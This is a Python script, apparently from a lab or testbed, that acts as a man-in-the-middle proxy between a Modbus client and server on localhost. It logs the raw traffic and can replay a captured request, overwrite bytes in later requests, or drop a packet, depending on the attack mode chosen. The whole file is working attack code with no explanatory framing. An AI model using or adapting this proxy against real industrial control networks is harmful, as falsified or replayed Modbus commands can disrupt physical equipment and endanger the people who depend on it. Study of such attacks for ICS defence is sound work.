import asyncio
import argparse
import logging

REPLAY_BUFFER = []

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("attacker")

parser = argparse.ArgumentParser(description="MITM Modbus Attacker")
parser.add_argument("--attack", choices=["replay", "modify", "delete", "none"], default="none", help="Type of attack to perform")
args = parser.parse_args()

CLIENT_HOST = "localhost"
CLIENT_PORT = 5020  # Client connects here
SERVER_HOST = "localhost"
SERVER_PORT = 1337  # MITM connects here

attack_mode = args.attack
first_packet = True

async def handle_client(client_reader, client_writer):
    global first_packet
    global first_packet_delete
    server_reader, server_writer = await asyncio.open_connection(SERVER_HOST, SERVER_PORT)

    async def forward(reader, writer, direction):
        global first_packet
        global first_packet_delete
        while True:
            data = await reader.read(1024)
            if not data:
                break

            logger.info(f"{direction} - Raw: {data.hex()}")

            if direction == "C→S":
                if first_packet:
                    logger.info("Passing first packet unmodified.")
                    first_packet = False
                    first_packet_delete = False
                    REPLAY_BUFFER.append(data)
                    writer.write(data)
                
                else:

                    if attack_mode == "replay":
                        if REPLAY_BUFFER:
                            logger.info("Replaying stored packet.")
                            writer.write(REPLAY_BUFFER[0])

                    elif attack_mode == "modify":
                        modified = bytearray(data)
                        if len(modified) > 6:
                            modified[13:15] = b'\x05\x39'
                            logger.info("Modified packet.")
                        writer.write(modified)

                    elif attack_mode == "delete":
                        if (first_packet_delete == False):
                            logger.info("Dropping first packet.")
                            first_packet_delete = True
                            continue
                        else:
                            writer.write(data)
            else:
                writer.write(data)

            await writer.drain()

    await asyncio.gather(
        forward(client_reader, server_writer, "C→S"),
        forward(server_reader, client_writer, "S→C")
    )

async def main():
    server = await asyncio.start_server(handle_client, CLIENT_HOST, CLIENT_PORT)
    logger.info(f"Attacker listening on {CLIENT_HOST}:{CLIENT_PORT}")
    async with server:
        await server.serve_forever()

if __name__ == "__main__":
    asyncio.run(main())

